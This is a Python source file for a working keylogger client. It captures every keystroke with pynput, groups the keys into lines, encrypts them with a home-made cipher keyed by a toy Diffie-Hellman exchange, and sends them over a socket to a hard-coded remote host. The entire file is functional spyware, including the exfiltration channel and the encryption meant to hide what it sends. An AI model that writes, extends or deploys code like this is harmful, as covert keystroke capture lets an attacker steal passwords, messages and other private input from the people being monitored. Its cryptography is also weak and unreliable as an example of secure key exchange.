import socket
from pynput.keyboard import Listener
import sys
import threading
import random


#CIPHER
def encrypt(message, key, const):
    text = list(message)
    j = 1
    for index_letter in range(len(text)):
        character = key.find(text[index_letter])
        if character < 0:
            pass
        else:
            text[index_letter] = key[(character + const + j) % len(key)]
        j += const
    return "".join(text)


def decrypt(message, key, const):
    text = list(message)
    j = 1
    for index_letter in range(len(text)):
        character = key.find(text[index_letter])
        if character < 0:
            pass
        else:
            for i in range(len(key)):
                indice = (const + j + i) % len(key)
                if  indice == character:
                    text[index_letter] = key[i]
                    break
        j += const
    return "".join(text)


def generate_key(list_characters=None, seed=0):
    if list_characters is None:
        list_characters = [chr(char) for char in range(5, 256)]
        if seed % len(list_characters) == 0:
            seed-=1
    random.seed(seed)
    random.shuffle(list_characters)
    return "".join(list_characters), seed


def generate_int(num_digits):
    return int(random.random()*10**num_digits)


def diffie_hellman(cxn): #simulates the diffie hellman algorithm generating short numbers for key exchange
    p, k, A = cxn.recv(1024).decode().split("\x03")
    p = int(p)
    k = int(k)
    A = int(A)
    y = generate_int(random.randint(2,4))
    B = k**y%p
    cxn.send(str(B).encode())
    return A**y%p 



#KEYLOGGER CLIENT
class Keylogger:

    def __init__(self, host, port):
        self.word = ""
        self.special_keys = ["Key.ctrl_l", "Key.ctrl_r", "Key.shift_l", "Key.shift_r",
                             "Key.cmd", "Key.cmd_r", "Key.alt_l", "Key.alt_r"]
        self.cxn = socket.create_connection((host, int(port)))
        self.integer_to_encrypt = diffie_hellman(self.cxn)
        self.key, self.integer_to_encrypt = generate_key(seed=self.integer_to_encrypt)
        self.stop = False

    def __keylogger(self, character):
        character = str(character)
        character = character.replace("'", "")

        if self.stop:
            return False

        elif character == "Key.space":
            character = " "
            self.word += character

        elif character in self.special_keys:
            pass

        elif character == "Key.tab":
            self.word += "\\t"

        elif character == "Key.backspace":
            self.word = self.word[:len(self.word)-1]

        elif character == "Key.enter":
            word = self.word + "\\n"
            th = threading.Thread(target=self.send_word, args=(word,))
            th.start()
            self.word = ""

        else:
            self.word += character

    def send_word(self, word):
        word = encrypt(word, self.key, self.integer_to_encrypt)
        try:
            self.cxn.send(word.encode("utf-8"))
        except Exception:
            self.stop = True

    def run(self):
        with Listener(on_press=self.__keylogger) as listen:
            listen.join()


if __name__ == "__main__":
    #Keylogger(sys.argv[1], sys.argv[2]).run()
    Keylogger("192.168.1.77", "6768").run()
    """key,const = generate_key(seed=2)
    message = "hola 123 123"
    me = encrypt(message, key,const)
    md = decrypt(me, key, const)
    print(message)
    print(me)
    print(md)
    """